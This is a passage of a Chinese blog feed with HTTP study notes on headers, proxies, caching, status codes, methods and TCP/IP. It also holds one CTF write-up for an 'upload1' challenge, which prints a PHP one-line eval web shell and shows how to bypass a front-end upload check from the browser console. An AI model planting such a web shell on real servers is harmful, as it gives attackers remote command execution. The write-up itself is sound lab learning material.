id="HTTP-1-1首部字段一览"><a href="#HTTP-1-1首部字段一览" class="headerlink" title="HTTP/1.1首部字段一览"></a>HTTP/1.1首部字段一览</h3><p><strong>通用首部字段</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313222507.png"></p><p><strong>请求首部字段</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313222543.png"></p><p><strong>响应首部字段</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313222557.png"></p><p><strong>实体首部字段</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313222611.png"></p><p>还有一些非HTTP/1.1的首部字段，如：Cookie、Set-Cookie、Content-Dispositon。</p><h3 id="End-to-end首部和Hop-by-hop首部"><a href="#End-to-end首部和Hop-by-hop首部" class="headerlink" title="End-to-end首部和Hop-by-hop首部"></a>End-to-end首部和Hop-by-hop首部</h3><p>HTTP首部字段将定义成缓存代理和费缓存代理的行为，分成2种类型。</p><p><strong>端到端首部（End-to-end Header）</strong></p><p>分在此类别中的首部会转发给请求/响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。</p><p><strong>逐跳首部（Hop-by-hop Header）</strong></p><p>分在此类别中的首部只对单次转发有效，会因通过缓存或代理而不再转发。HTTP/1.1和之后版本中，如果要使用hop-by-hop首部，需提供Connection首部字段。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313222840.png"></p><p>除以上外，都是端到端首部。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP详解(五)——与HTTP协作的Web服务器</title>
      <link href="2020/03/13/20200313220856/"/>
      <url>2020/03/13/20200313220856/</url>
      
        <content type="html"><![CDATA[<h1 id="用单台虚拟机主机事先多个域名"><a href="#用单台虚拟机主机事先多个域名" class="headerlink" title="用单台虚拟机主机事先多个域名"></a>用单台虚拟机主机事先多个域名</h1><p>HTTP/1.1规范允许一台HTTP服务器搭建多个Web站点。比如，提供Web托管服务（Web Hosting Service）的供应商，可以用一台服务器为多位客户服务，也可以以每位客户持有的域名运行各自不同的网站。</p><p>在访问网页时，DNS将域名解析成IP地址。在相同的IP地址下，由于虚拟主机可以寄存多个不同主机名和域名的Web网站，因此在发送HTTP请求时，必须在Host内部完整指定主机名或域名的URI。</p><h1 id="通信数据转发程序：代理、网关、隧道"><a href="#通信数据转发程序：代理、网关、隧道" class="headerlink" title="通信数据转发程序：代理、网关、隧道"></a>通信数据转发程序：代理、网关、隧道</h1><p>HTTP通信时，除客户端和服务器以外，还有一些用于通信数据转发的应用程序，例如代理、网关和隧道。它们可以配合服务器工作。</p><p><strong>代理：</strong></p><p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。</p><p><strong>网关：</strong></p><p>网关是转发其它服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关。</p><p><strong>隧道：</strong></p><p>隧道是在相隔甚远的客户端与服务器两者之间进行中转，并保持双方通信连接的应用程序。</p><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>代理服务器的基本行为就是接受客户端发送的请求后转发给其他服务器。代理不改变请求URI，会直接发送给前方持有资源的目标服务器。持有资源实体的服务器被称为源服务器。从源服务器返回的响应进过代理服务器后再传给客户端。</p><p>使用代理服务器的理由有：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的，等等。</p><p>代理有多种使用方法，按两种基准分类。一种是否使用缓存，另一种是是否会修改报文。</p><p><strong>缓存代理</strong></p><p>代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。</p><p><strong>透明代理</strong></p><p>转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。</p><h3 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h3><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313221233.png"></p><p>利用网关可以由HTTP请求转化为其他协议通信</p><p>网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非HTTP协议服务。</p><p>利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如，网关可以连接数据库，使用SQL语句查询数据。另外，在Web购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动。</p><h3 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h3><p>隧道可按要求建立起一条与其他服务器的通信线路，届时使用SSL等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。隧道本身不会去解析HTTP请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。</p><h1 id="保存资源的缓存"><a href="#保存资源的缓存" class="headerlink" title="保存资源的缓存"></a>保存资源的缓存</h1><p>缓存是指代理服务器或客户端本地磁盘内保存的资源副本。利用缓存可减少对源服务器的访问，因此也就节省了通信流量和通信时间。</p><p>缓存服务器是代理服务器的一种，并归类在缓存代理类型中。</p><h3 id="缓存的有效期限"><a href="#缓存的有效期限" class="headerlink" title="缓存的有效期限"></a>缓存的有效期限</h3><p>当遇上源服务器上的资源更新时，如果还是使用不变的缓存，那就会演变成返回更新前的“旧”资源了。</p><p>即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性，若判断缓存失效，缓存服务器将会再次从源服务器上获取“新“资源。</p><h3 id="客户端的缓存"><a href="#客户端的缓存" class="headerlink" title="客户端的缓存"></a>客户端的缓存</h3><p>缓存不仅可以存在于服务器内，还可以存在客户端浏览器中。</p><p>比如说，访问一个静态页面，当服务端更新内容后，你在本地之前请求过，现在再次请求，你访问的页面可能就是你之前的缓存，没有刷新出服务器新增的内容。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web进阶upload1</title>
      <link href="2020/03/13/20200313214351/"/>
      <url>2020/03/13/20200313214351/</url>
      
        <content type="html"><![CDATA[<p>打开网站，发现只存在一个选择文件框和一个上传按钮。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313214718.png"></p><p>我们可以考虑直接上传一个一句话木马尝试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313214815.png"></p><p>快速弹出警告框，让上传图片文件。猜测是前端js判断。</p><p><code>F12</code>打开控制台，成功发现js代码，右击直接删掉。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313215055.png"></p><p>重新选择一句话木马，此时发现上传按钮无法点击，在<code>F12</code>的<code>console</code>中将按钮的<code>disabled</code>设置为<code>false</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">submit.disabled=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>按钮的id值可通过源代码查看得到。</p><p>点击上传，得到上传路劲。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313215438.png"></p><p>通过蚁剑连接一句话木马，成功得到flag。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313215540.png"></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>后来写wp的时候，发现可以省略删除js源码那一步，因为虽然弹窗了，但是没有清空选择的文件，可以直接通过更改按钮属性直接上传。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>写了几道php源码的题，什么phps源码泄露、反序列化，头大，碰到这道简单的，开心死了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP详解(四)——返回结果的HTTP状态码</title>
      <link href="2020/03/10/20200310152827/"/>
      <url>2020/03/10/20200310152827/</url>
      
        <content type="html"><![CDATA[<p>HTTP状态码负责表示客户端HTTP请求的返回结果、标记服务器端的处理是否正常、通知出现的错误等工作。</p><h1 id="状态码告知从服务器端返回的请求结果"><a href="#状态码告知从服务器端返回的请求结果" class="headerlink" title="状态码告知从服务器端返回的请求结果"></a>状态码告知从服务器端返回的请求结果</h1><p>状态码的职责是当客户端向服务器端发送请求时，描述返回的请求结果。借助状态码，用户可以知道服务器端是正常处理了请求，还是出现了错误。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200310152949.png"></p><h1 id="2XX成功"><a href="#2XX成功" class="headerlink" title="2XX成功"></a>2XX成功</h1><p>2XX的响应结果表明请求被正常处理了。</p><h3 id="200-OK"><a href="#200-OK" class="headerlink" title="200 OK"></a>200 OK</h3><p>表示冲客户端发来的请求在服务器端被正常处理了。</p><p>在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用GET方法时，对应请求资源的实体会作为响应返回；而使用HEAD方法时，对应请求资源的实体首部不随报文主体作为响应返回（即在响应中只返回首部，不会返回实体的主体部分）。</p><h3 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h3><p>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求后，返回204响应，那么浏览器显示的页面不发生更新。</p><p>一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p><h3 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h3><p>该状态吗表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容。</p><h1 id="3XX重定向"><a href="#3XX重定向" class="headerlink" title="3XX重定向"></a>3XX重定向</h1><h3 id="301-Moved-Permanently"><a href="#301-Moved-Permanently" class="headerlink" title="301 Moved Permanently"></a>301 Moved Permanently</h3><p>永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应使用资源现在所指的URI。也就是说，如果已经把资源对应的URI保存为书签了，这时应该按Location首部字段提示的URI重新保存。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200310153203.png"></p><h3 id="302-Found"><a href="#302-Found" class="headerlink" title="302 Found"></a>302 Found</h3><p>临时性重定向。该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI访问。</p><h3 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h3><p>该状态码表示由于请求对应的资源存在着另一个URI，应使用GET方法定向获取请求的资源。</p><blockquote><p>注：当301、302、303响应码返回时，几乎所有的浏览器都会把POST改成GET，并删除请求报文内的主体，之后请求会自动再次发送。</p><p>301、302标准是禁止将POST方法改变成GET方法的，但实际使用时大家都会这么做。</p></blockquote><h3 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h3><p>该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304为满足条件的情况。304状态码返回时，不包括任何响应的主体部分。304虽被划分在3XX类别中，但是和重定向没有关系。</p><p>附带条件的请求是指采用GET方法的请求报文中包含If-Match,If-Modified-Since,If-None-Match,If-Range,If-Unmodified-Since中任一首部。</p><h3 id="307-Temporary-Redirect"><a href="#307-Temporary-Redirect" class="headerlink" title="307 Temporary Redirect"></a>307 Temporary Redirect</h3><p>临时重定向。该状态码与302 Found有着相同的含义。302标准禁止POST变换成GET，但实际使用时大家并不遵守。307遵照浏览器标准，不会从POST变成GET，但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。</p><h1 id="4XX客户端错误"><a href="#4XX客户端错误" class="headerlink" title="4XX客户端错误"></a>4XX客户端错误</h1><h3 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h3><p>该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。</p><h3 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h3><p>该状态码表示发送的请求需要有通过HTTP认证（BASIC认证、DIGEST认证）的认证信息。另外若之前已进行过1次请求，则表示用户认证失败。</p><p>返回含有401的响应必须包含一个使用于被请求资源的WWW-Authenticate首部用以质询（challenge）用户信息。当浏览器初次接收到401响应，会弹出认证用的对话窗口。</p><h3 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h3><p>该状态码标明对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。</p><h3 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h3><p>该状态码标明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p><h1 id="5xx服务器错误"><a href="#5xx服务器错误" class="headerlink" title="5xx服务器错误"></a>5xx服务器错误</h1><h3 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h3><p>该状态码标明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug或某些临时的故障。</p><h3 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h3><p>该状态码表明服务器暂时处于超负荷或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入RetryAfter首部字段再返回给客户端。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP详解(三)——HTTP报文内的HTTP信息</title>
      <link href="2020/03/09/20200309220109/"/>
      <url>2020/03/09/20200309220109/</url>
      
        <content type="html"><![CDATA[<p>HTTP通信过程包括从客户端发往服务器端的请求及从服务器端返回客户端的响应。</p><h1 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h1><p>用于HTTP协议交互的信息被称为HTTP报文。请求端（客户端）的HTTP报文叫做请求报文，响应端（服务器端）的叫做响应报文。</p><p>HTTP报文本身是由多行（用CR+LF作换行符）数据构成的字符串文本。</p><p>HTTP报文大致可分为报文首部和报文主体两块。两者由最初出现的空行（CR+LF）来划分。通常，并不一定要有报文主体。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200309220251.png"></p><h1 id="请求报文及响应报文的结构"><a href="#请求报文及响应报文的结构" class="headerlink" title="请求报文及响应报文的结构"></a>请求报文及响应报文的结构</h1><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200309220337.png"></p><h1 id="编码提升传输速率"><a href="#编码提升传输速率" class="headerlink" title="编码提升传输速率"></a>编码提升传输速率</h1><p>HTTP在传输数据时可以按照数据原貌直接传输，但也可以在传输过程中通过编码提升传输速率。通过在传输时编码，能有效地处理大量的访问请求。但是，编码的操作需要计算机来完成，因此会消耗更多的CPU资源。</p><h2 id="报文主体和实体主体的差异"><a href="#报文主体和实体主体的差异" class="headerlink" title="报文主体和实体主体的差异"></a>报文主体和实体主体的差异</h2><ul><li><p>报文（message）</p><p>是HTTP通信中的基本单位，由8位组字节流（octet sequence，其中octet为8个比特）组成，通过HTTP通信传输。</p></li><li><p>实体（entity）</p><p>作为请求或响应的有效载荷数据（补充项）被传输，其内容由实体首部和实体主体组成。</p></li></ul><p>HTTP报文的主体用于传输请求或响应的实体主体。</p><p>通常，报文主体等于实体主体。只有当传输中进行编码操作时，实体主体的内容发生变化，猜到是它和报文主体产生差异。</p><p>我们可以理解为实体是想要传输的信息，实体通过报文的形式来进行传输。</p><h1 id="获取部分内容的范围请求"><a href="#获取部分内容的范围请求" class="headerlink" title="获取部分内容的范围请求"></a>获取部分内容的范围请求</h1><p>下载中间暂停后，继续下载不用重新开始的问题，叫做范围请求（Range Request）。</p><p>针对范围请求，响应会返回状态码为206 Partial Content的响应报文。另外，对于多重范围的范围请求，响应会在首部字段Content-Type标明multipart/byteranges后返回响应报文。</p><p>如果服务器端无法响应范围请求，则会返回状态码200 OK和完整的实体内容。</p><h1 id="内容协商返回最合适的内容"><a href="#内容协商返回最合适的内容" class="headerlink" title="内容协商返回最合适的内容"></a>内容协商返回最合适的内容</h1><p>当浏览器的默认语言为英语或中文，访问相同URI的Web页面时，则会显示对应的英语版或中文版的Web页面。这样的机制称为内容协商（Content Negotiation）。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP详解(二)——简单的HTTP协议</title>
      <link href="2020/03/09/20200309213940/"/>
      <url>2020/03/09/20200309213940/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP协议用于客户端和服务端之间的通信"><a href="#HTTP协议用于客户端和服务端之间的通信" class="headerlink" title="HTTP协议用于客户端和服务端之间的通信"></a>HTTP协议用于客户端和服务端之间的通信</h1><p>HTTP协议和TCP/IP协议族内的其他众多协议相同，用于客户端和服务器之间的通信。</p><p>请求访问文本或图像等资源的一端称为客户端，而提供资源响应的一端称为服务器端。</p><p>有时候，按实际情况，两台计算机作为客户端和服务器端的角色有可能会互换。但就仅从一条通信线路来说，服务器端和客户端的角色是确定的，而用HTTP协议能够明确区分那端是客户端，哪端是服务器端。</p><h1 id="通过请求和相应的交换达成通信"><a href="#通过请求和相应的交换达成通信" class="headerlink" title="通过请求和相应的交换达成通信"></a>通过请求和相应的交换达成通信</h1><p>请求报文是由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成的。</p><p>响应报文基本上由协议版本、状态码（表示请求成功或失败的数字代码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成。</p><h1 id="HTTP是不保存状态的协议（对用户的登陆状态不进行保存）"><a href="#HTTP是不保存状态的协议（对用户的登陆状态不进行保存）" class="headerlink" title="HTTP是不保存状态的协议（对用户的登陆状态不进行保存）"></a>HTTP是不保存状态的协议（对用户的登陆状态不进行保存）</h1><p>HTTP是一种不保存状态，即无状态（stateless）协议。HTTP协议自身不对请求和响应之间的通信状态进行保存。也就是说在HTTP这个级别，协议对于发送过的请求或响应都不做持久化处理。</p><p>使用HTTP协议，每当有新的请求发送时，就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应报文的信息。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把HTTP协议设计成如此简单的。</p><p>HTTP/1.1虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了Cookie技术。有了Cookie再用HTTP协议通信，就可以管理状态了。</p><h1 id="请求URL定位资源"><a href="#请求URL定位资源" class="headerlink" title="请求URL定位资源"></a>请求URL定位资源</h1><p>在WWW上，每一信息资源都有统一的且在网上唯一的地址，该地址就叫URL（Uniform Resource Locator,统一资源定位符），它是WWW的统一资源定位标志，就是指网络地址。</p><p>URL由三部分组成：资源类型、存放资源的主机域名、资源文件名。也可认为由四部分组成：协议、主机、端口、路径。</p><blockquote><p>protocal://hostname[:port]/path/[;parameters][?query]#fragment</p><p>注：带方括号[]的为可选项，默认的port为80</p></blockquote><h1 id="告知服务器意图的HTTP方法"><a href="#告知服务器意图的HTTP方法" class="headerlink" title="告知服务器意图的HTTP方法"></a>告知服务器意图的HTTP方法</h1><h4 id="GET：获取资源"><a href="#GET：获取资源" class="headerlink" title="GET：获取资源"></a>GET：获取资源</h4><p>GET方法用来请求访问已被URI识别的资源。指定的资源经服务器端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保持原样返回，如果是向CGI（Common Gateway Interface，通用网关接口）那样的程序，则返回经过执行后的输出结果。</p><h4 id="POST：传输实体主体"><a href="#POST：传输实体主体" class="headerlink" title="POST：传输实体主体"></a>POST：传输实体主体</h4><p>POST方法用来传输实体的主体。</p><p>虽然用GET方法也可以传输实体的主体，但一般不用GET方法进行传输，而是用POST方法。虽然POST的功能与GET很相似，但POST的主要目的并不是获取响应的主体内容。</p><h4 id="PUT：传输文件"><a href="#PUT：传输文件" class="headerlink" title="PUT：传输文件"></a>PUT：传输文件</h4><p>PUT方法用来传输文件。就像FTP协议的文件上传一样，要求在请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。</p><p>但是，鉴于HTTP/1.1的PUT方法自身不带验证机制，任何人都可以上传文件，存在安全性问题，因此一般的Web网站不使用该方法。若配合Web应用程序的验证机制，或架构设计采用REST（Representational State Transfer，表征状态转移）标准的同类Web网站，就可能会开放使用PUT方法。</p><h4 id="HEAD：获得报文首部"><a href="#HEAD：获得报文首部" class="headerlink" title="HEAD：获得报文首部"></a>HEAD：获得报文首部</h4><p>HEAD方法和GET方法一样，只是不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等。</p><h4 id="DELETE：删除文件"><a href="#DELETE：删除文件" class="headerlink" title="DELETE：删除文件"></a>DELETE：删除文件</h4><p>DELETE方法用来删除文件，是与PUT相反的方法。DELETE方法按请求URI删除指定的资源。</p><p>但是，HTTP/1.1的DELETE方法本身和PUT方法一样不带验证机制，所以一般的Web网站也不使用DELETE方法，当配合Web应用程序的验证机制，或遵守REST标准时还是有可能开放使用的。</p><h4 id="OPTIONS：询问支持的方法"><a href="#OPTIONS：询问支持的方法" class="headerlink" title="OPTIONS：询问支持的方法"></a>OPTIONS：询问支持的方法</h4><p>OPTIONS方法用来查询针对URI指定的资源支持的方法。</p><h4 id="TRACE：追踪路径"><a href="#TRACE：追踪路径" class="headerlink" title="TRACE：追踪路径"></a>TRACE：追踪路径</h4><p>TRACE方法是让Web服务器端将之前的请求通信环回给客户端的方法。</p><h4 id="CONNECT：要求用隧道协议连接代理"><a href="#CONNECT：要求用隧道协议连接代理" class="headerlink" title="CONNECT：要求用隧道协议连接代理"></a>CONNECT：要求用隧道协议连接代理</h4><p>CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL（Secure Sockets Layer，安全套接层）和TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p><blockquote><p>重要的是GET方法和POST方法的区别</p></blockquote><h1 id="持久连接节省通信量"><a href="#持久连接节省通信量" class="headerlink" title="持久连接节省通信量"></a>持久连接节省通信量</h1><p>HTTP通信一次，进行一次TCP的连接与断开，若HTTP传输的信息很多，每次都要进行TCP连接与断开，造成了无谓的通信量开销。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200309215518.png"></p><h2 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h2><p>为解决上述的TCP连接问题，HTTP/1.1和一部分的HTTP/1.0相处了持久连接（HTTP Persistent Connections，也称为HTTP keep-alive或HTTP connection reuse）的方法。持久连接的特点是，只要任意一端没有明确提出断开连接，则保持TCP连接状态。</p><p>持久连接的好处在于减少了TCP连接的重复建立和断开造成的额外开销，减轻了服务器端的负载。另外，减少开销的那部分时间，使HTTP请求和响应能够更早地结束，这样Web页面的显示速度也就相应提高了。</p><p>在HTTP/1.1中，所有的连接默认都是持久连接，但在HTTP/1.0内并未标准化。虽然有一部分服务器通过非标准的手段实现了持久连接，但服务器端不一定能够支持持久连接。毫无疑问，除了服务器端，客户端也需要支持持久连接。</p><h2 id="管线化"><a href="#管线化" class="headerlink" title="管线化"></a>管线化</h2><p>持久连接使得多数请求以管线化（pipelining）方式发送称为可能。从前发送请求后需等待并收到响应，才能发送下一个请求。管线化技术出现后，不用等待响应亦可直接发送下一个请求。这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待响应了。</p><h1 id="使用Cookie的状态管理"><a href="#使用Cookie的状态管理" class="headerlink" title="使用Cookie的状态管理"></a>使用Cookie的状态管理</h1><p>HTTP是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。</p><p>为了保留无状态协议这个特征的同事又要解决类似的矛盾问题，于是引入了Cookie技术。Cookie技术通过在请求和响应报文中写入Cookie信息来控制客户端的状态。</p><p>Cookie会根据从服务器端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie值后发送出去。</p><p>服务器端发现客户端发送过来的Cookie后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP详解(一)——了解Web及网络基础</title>
      <link href="2020/03/09/20200309212639/"/>
      <url>2020/03/09/20200309212639/</url>
      
        <content type="html"><![CDATA[<h1 id="使用HTTP协议访问Web"><a href="#使用HTTP协议访问Web" class="headerlink" title="使用HTTP协议访问Web"></a>使用HTTP协议访问Web</h1><p>通过发送请求获取服务器资源的Web浏览器等，都可称为客户端（client）。</p><p>Web使用一种名为HTTP（HyperText Transfer Protocol，超文本传输协议）的协议作为规范，完成从客户端到服务器端等一系列运作流程。协议是指规则的约束。Web是建立在HTTP协议上通信的。</p><h1 id="网络协议TCP-IP"><a href="#网络协议TCP-IP" class="headerlink" title="网络协议TCP/IP"></a>网络协议TCP/IP</h1><h2 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h2><p>计算机与网络设备要相互通信，双方就必须基于相同的方法。比如，如何探测到通信目标、由哪一边先发起通信、使用哪种语言进行通信、怎样结束通信等规则都需要事先确定。不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议（Protocol）。</p><p>协议中存在各式各样的内容。从电缆的规格到IP地址的选定方法、寻找异地用户的方法、双方建立通信的顺序，以及Web页面显示需要处理的步骤等等。</p><p>像这样把与互联网相关联的协议集合起来总称为TCP/IP。也有说法认为，TCP/IP是指TCP和IP这两种协议。还有一种说法认为，TCP/IP是在IP协议的通信过程中，使用到的协议族的统称。</p><h2 id="TCP-IP的分层管理"><a href="#TCP-IP的分层管理" class="headerlink" title="TCP/IP的分层管理"></a>TCP/IP的分层管理</h2><p>TCP/IP协议族里重要的一点就是分层。TCP/IP协议族按层次分为以下4层：应用层、传输层、网络层和数据链路层。</p><p>把TCP/IP层次化的好处是，当互联网中某个地方需要改变设计时，只需要把变动的层替换掉就可以，把各层之间的接口部分规划好后，就可以了。</p><p>层次化之后，设计也变得相对简单了。处于应用层上的应用可以只考虑分派给自己的任务，而不需要弄清楚对方在地球上哪个地方、对方的传输线路是怎样的、是否能确保传达等问题。</p><h3 id="TCP-IP协议族各层的作用"><a href="#TCP-IP协议族各层的作用" class="headerlink" title="TCP/IP协议族各层的作用"></a>TCP/IP协议族各层的作用</h3><ul><li><p>应用层</p><p>应用层决定了向用户提供服务时通信的活动。</p><p>TCP/IP协议族内预存了各类通用的应用服务。比如，FTP(File Transfer Protocol,文件传输协议）和DNS(Domain Name System，域名系统）服务就是其中两类。HTTP协议也处于该层。</p></li><li><p>传输层</p><p>传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。</p><p>在传输层有两个性质不同的协议：TCP（Transmission Control Protocol,传输控制协议）和UDP(User Data Protocol,用户数据包协议）。</p></li><li><p>网络层</p><p>网络层用来处理在网络上流动的数据包。数据包是网络传输的最小数据单元。该层规定了通过怎样的路径（所谓的传输线路）到达对方计算机，并把数据包传送给对方。</p><p>与对方计算机之间通过多态计算机或网络设备进行传输时，网络层说起的作用就是在众多的选项内选择一条传输线路。</p></li><li><p>链路层（又名数据链路层，网络接口层）</p><p>用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card,网络适配器，即网卡），及光纤等物理课件部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。</p></li></ul><h2 id="TCP-IP通信传输流"><a href="#TCP-IP通信传输流" class="headerlink" title="TCP/IP通信传输流"></a>TCP/IP通信传输流</h2><p><img src= "/img/loading.gif" 